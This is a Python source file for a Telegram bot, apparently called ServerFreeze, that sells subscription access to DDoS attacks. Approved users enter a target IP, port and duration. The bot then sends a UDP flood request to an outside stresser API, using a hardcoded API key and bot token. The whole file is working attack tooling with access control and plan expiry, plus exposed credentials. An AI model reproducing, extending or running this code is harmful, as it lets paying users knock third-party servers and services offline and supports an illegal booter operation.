import os
import telebot
import logging
import time
import requests
from datetime import datetime, timedelta
from threading import Thread
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- Configurations ---
TOKEN = '7149714912:AAEeGl6cSo1IG3y6Tuf6aomE62Uoc5Xtqjw'
ADMIN_ID = 7149714912
USER_FILE = "users.txt"

# API Settings
API_KEY = "153ce84f604a45247718a549d43ea55665d860146b73e906cacb2e01910a8e6c"
API_URL = "https://retrostress.net/api/v1/tests"

bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# --- File Operations ---

def load_users():
    users = {}
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            for line in f:
                try:
                    u_id, plan, expiry = line.strip().split(',')
                    users[int(u_id)] = {"plan": int(plan), "valid_until": expiry}
                except:
                    continue
    return users

def save_user(user_id, plan, days):
    expiry_date = (datetime.now() + timedelta(days=days)).date().isoformat()
    users = load_users()
    users[user_id] = {"plan": plan, "valid_until": expiry_date}
    with open(USER_FILE, "w") as f:
        for u_id, data in users.items():
            f.write(f"{u_id},{data['plan']},{data['valid_until']}\n")
    return expiry_date

def remove_user(user_id):
    users = load_users()
    if user_id in users:
        del users[user_id]
        with open(USER_FILE, "w") as f:
            for u_id, data in users.items():
                f.write(f"{u_id},{data['plan']},{data['valid_until']}\n")

# --- API Attack Logic ---

def call_attack_api(target_ip, target_port, duration):
    headers = {
        "Authorization": f"Bearer {API_KEY}",
        "Content-Type": "application/json"
    }
    data = {
        "target": target_ip,
        "port": int(target_port),
        "duration": int(duration),
        "method": "UDP-CUSTOM",
        "params": {
            "packetSize": "800",
            "payload": "00000000"
        }
    }
    try:
        response = requests.post(API_URL, headers=headers, json=data, timeout=10)
        return response.json()
    except Exception as e:
        return {"error": str(e)}

# --- Bot Handlers ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("Instant Plan 🧡"), KeyboardButton("Instant++ Plan 💥"),
               KeyboardButton("Canary Download✔️"), KeyboardButton("My Account🏦"),
               KeyboardButton("Help❓"), KeyboardButton("Contact admin✔️"))
    bot.send_message(message.chat.id, "*Welcome to ServerFreeze API Bot!*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        cmd_parts = message.text.split()
        target_id, plan, days = int(cmd_parts[1]), int(cmd_parts[2]), int(cmd_parts[3])
        expiry = save_user(target_id, plan, days)
        bot.send_message(message.chat.id, f"✅ User {target_id} approved until {expiry}")
    except:
        bot.reply_to(message, "Usage: /approve <id> <plan> <days>")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    users = load_users()
    if user_id not in users:
        bot.reply_to(message, "❌ Not approved.")
        return
    bot.send_message(message.chat.id, "Enter IP Port Time:")
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        args = message.text.split()
        target_ip, target_port, duration = args[0], args[1], args[2]
        
        if int(target_port) in blocked_ports:
            bot.send_message(message.chat.id, "❌ Port blocked.")
            return

        bot.send_message(message.chat.id, "🚀 Sending request to API...")
        
        # API Call
        result = call_attack_api(target_ip, target_port, duration)
        
        if result.get("success") or "id" in str(result):
            bot.send_message(message.chat.id, f"💥 Attack Sent!\nTarget: {target_ip}:{target_port}\nDuration: {duration}s")
        else:
            bot.send_message(message.chat.id, f"❌ API Error: {result}")
    except:
        bot.send_message(message.chat.id, "❌ Invalid input.")

@bot.message_handler(func=lambda m: True)
def handle_menu(message):
    if message.text == "My Account🏦":
        users = load_users()
        user_id = message.from_user.id
        if user_id in users:
            bot.reply_to(message, f"👤 ID: {user_id}\n📅 Expiry: {users[user_id]['valid_until']}")
    elif message.text == "Instant++ Plan 💥":
        attack_command(message)
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "Admin: @BLACK_XOWNER")

if __name__ == "__main__":
    logging.info("🤖 Bot is starting (API Method)...")
    bot.polling(none_stop=True)
  
